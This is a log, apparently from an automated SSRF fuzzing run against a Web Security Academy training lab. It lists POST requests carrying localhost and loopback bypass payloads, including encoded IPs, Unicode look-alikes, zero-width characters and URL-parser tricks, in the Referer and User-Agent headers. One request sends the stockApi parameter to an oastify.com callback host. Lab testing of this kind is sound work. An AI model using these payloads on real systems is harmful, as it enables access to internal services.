[2025-03-26T07:24:09.749247] method=POST param='stockApi' → https://	bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:41.987455] method=POST param='header: referer' → https://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:42.361109] method=POST param='header: referer' → https://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:42.715945] method=POST param='header: referer' → https://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:43.066061] method=POST param='header: referer' → https://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:43.375410] method=POST param='header: referer' → https://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:43.758629] method=POST param='header: referer' → https://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:44.066849] method=POST param='header: referer' → https://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:44.421841] method=POST param='header: referer' → https://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:44.783854] method=POST param='header: referer' → https://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:45.147706] method=POST param='header: referer' → http://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:45.504557] method=POST param='header: referer' → http://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:45.879000] method=POST param='header: referer' → http://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:46.248935] method=POST param='header: referer' → http://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:46.603683] method=POST param='header: referer' → http://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:46.963373] method=POST param='header: referer' → http://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:47.311783] method=POST param='header: referer' → http://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:47.708497] method=POST param='header: referer' → http://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:48.062867] method=POST param='header: referer' → http://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:48.424028] method=POST param='header: referer' → http://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:48.802654] method=POST param='header: referer' → http://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:49.162788] method=POST param='header: referer' → http://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:49.542232] method=POST param='header: referer' → http://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:49.930894] method=POST param='header: referer' → http://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:50.276109] method=POST param='header: referer' → http://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:50.635731] method=POST param='header: referer' → http://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:51.010619] method=POST param='header: referer' → http://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:51.375895] method=POST param='header: referer' → http://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:51.771325] method=POST param='header: referer' → http://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:52.158394] method=POST param='header: referer' → http://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:52.515034] method=POST param='header: referer' → http://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:52.881738] method=POST param='header: referer' → http://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:53.248884] method=POST param='header: referer' → http://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:53.612849] method=POST param='header: referer' → http://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:53.927297] method=POST param='header: referer' → http://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:54.308759] method=POST param='header: referer' → http://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:54.681976] method=POST param='header: referer' → http://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:54.986235] method=POST param='header: referer' → http://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:55.296529] method=POST param='header: referer' → http://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:55.617852] method=POST param='header: referer' → http://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:56.004766] method=POST param='header: referer' → http://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:56.382375] method=POST param='header: referer' → http://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:56.750049] method=POST param='header: referer' → http://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:57.064084] method=POST param='header: referer' → http://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:57.422662] method=POST param='header: referer' → http://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:57.784469] method=POST param='header: referer' → http://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:58.154457] method=POST param='header: referer' → http://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:58.530377] method=POST param='header: referer' → http://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:58.896071] method=POST param='header: referer' → http://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:59.270162] method=POST param='header: referer' → http://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:59.590847] method=POST param='header: referer' → http://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:59:59.975596] method=POST param='header: referer' → http://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:00.319716] method=POST param='header: referer' → http://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:00.673440] method=POST param='header: referer' → http://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:01.059000] method=POST param='header: referer' → http://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:01.406827] method=POST param='header: referer' → http://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:01.730791] method=POST param='header: referer' → http://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:02.106629] method=POST param='header: referer' → http://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:02.494199] method=POST param='header: referer' → http://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:02.813009] method=POST param='header: referer' → http://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:03.121776] method=POST param='header: referer' → http://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:03.477328] method=POST param='header: referer' → http://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:03.860428] method=POST param='header: referer' → http://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:04.185454] method=POST param='header: referer' → http://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:04.541812] method=POST param='header: referer' → http://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:04.906193] method=POST param='header: referer' → http://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:05.259826] method=POST param='header: referer' → http://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:05.563702] method=POST param='header: referer' → http://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:05.881078] method=POST param='header: referer' → http://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:06.266563] method=POST param='header: referer' → http://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:06.637103] method=POST param='header: referer' → http://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:07.015445] method=POST param='header: referer' → http://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:07.319523] method=POST param='header: referer' → http://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:07.674909] method=POST param='header: referer' → http://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:08.010924] method=POST param='header: referer' → http://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:08.376393] method=POST param='header: referer' → http://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:08.699113] method=POST param='header: referer' → https://localhost#@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:09.085563] method=POST param='header: referer' → https://localhost%23@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:09.391770] method=POST param='header: referer' → http://localhost#@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:09.703892] method=POST param='header: referer' → http://localhost%23@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:10.052870] method=POST param='header: user-agent' → https://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:10.400487] method=POST param='header: user-agent' → https://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:10.772954] method=POST param='header: user-agent' → https://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:11.139393] method=POST param='header: user-agent' → https://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:11.503041] method=POST param='header: user-agent' → https://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:11.863987] method=POST param='header: user-agent' → https://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:12.225901] method=POST param='header: user-agent' → https://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:12.613263] method=POST param='header: user-agent' → https://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:12.948124] method=POST param='header: user-agent' → https://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:13.294391] method=POST param='header: user-agent' → https://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:13.685491] method=POST param='header: user-agent' → https://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:14.044146] method=POST param='header: user-agent' → https://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:14.387523] method=POST param='header: user-agent' → https://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:14.735797] method=POST param='header: user-agent' → https://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:15.050110] method=POST param='header: user-agent' → https://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:15.391817] method=POST param='header: user-agent' → https://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:15.782811] method=POST param='header: user-agent' → https://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:16.143822] method=POST param='header: user-agent' → https://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:16.525516] method=POST param='header: user-agent' → https://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:16.836413] method=POST param='header: user-agent' → https://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:17.196460] method=POST param='header: user-agent' → https://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:17.515514] method=POST param='header: user-agent' → https://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:17.860693] method=POST param='header: user-agent' → https://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:18.207428] method=POST param='header: user-agent' → https://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:18.531814] method=POST param='header: user-agent' → https://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:18.883755] method=POST param='header: user-agent' → https://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:19.230546] method=POST param='header: user-agent' → https://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:19.572097] method=POST param='header: user-agent' → https://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:19.932387] method=POST param='header: user-agent' → https://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:20.235051] method=POST param='header: user-agent' → https://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:20.591303] method=POST param='header: user-agent' → https://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:20.957571] method=POST param='header: user-agent' → https://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:21.308806] method=POST param='header: user-agent' → https://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:21.665123] method=POST param='header: user-agent' → https://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:22.022944] method=POST param='header: user-agent' → https://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:22.345774] method=POST param='header: user-agent' → https://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:22.697315] method=POST param='header: user-agent' → https://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:23.071395] method=POST param='header: user-agent' → https://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:23.434068] method=POST param='header: user-agent' → https://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:23.788006] method=POST param='header: user-agent' → https://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:24.170569] method=POST param='header: user-agent' → https://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:24.495384] method=POST param='header: user-agent' → https://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:24.829485] method=POST param='header: user-agent' → https://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:25.186610] method=POST param='header: user-agent' → https://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:25.484335] method=POST param='header: user-agent' → https://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:25.875393] method=POST param='header: user-agent' → https://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:26.237883] method=POST param='header: user-agent' → https://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:26.622257] method=POST param='header: user-agent' → https://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:26.985946] method=POST param='header: user-agent' → https://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:27.362125] method=POST param='header: user-agent' → https://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:27.677925] method=POST param='header: user-agent' → https://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:28.045336] method=POST param='header: user-agent' → https://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:28.425663] method=POST param='header: user-agent' → https://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:28.760263] method=POST param='header: user-agent' → https://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:29.156837] method=POST param='header: user-agent' → https://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:29.524696] method=POST param='header: user-agent' → https://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:29.905803] method=POST param='header: user-agent' → https://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:30.263864] method=POST param='header: user-agent' → https://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:30.578877] method=POST param='header: user-agent' → https://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:30.971609] method=POST param='header: user-agent' → https://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:31.347192] method=POST param='header: user-agent' → https://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:31.699545] method=POST param='header: user-agent' → https://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:32.013519] method=POST param='header: user-agent' → https://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:32.360867] method=POST param='header: user-agent' → https://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:32.716812] method=POST param='header: user-agent' → https://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:33.082083] method=POST param='header: user-agent' → https://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:33.435313] method=POST param='header: user-agent' → http://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:33.764377] method=POST param='header: user-agent' → http://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:34.106912] method=POST param='header: user-agent' → http://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:34.471990] method=POST param='header: user-agent' → http://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:34.839502] method=POST param='header: user-agent' → http://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:35.195739] method=POST param='header: user-agent' → http://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:35.543664] method=POST param='header: user-agent' → http://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:35.909738] method=POST param='header: user-agent' → http://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:36.282942] method=POST param='header: user-agent' → http://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:36.627914] method=POST param='header: user-agent' → http://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:36.931825] method=POST param='header: user-agent' → http://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
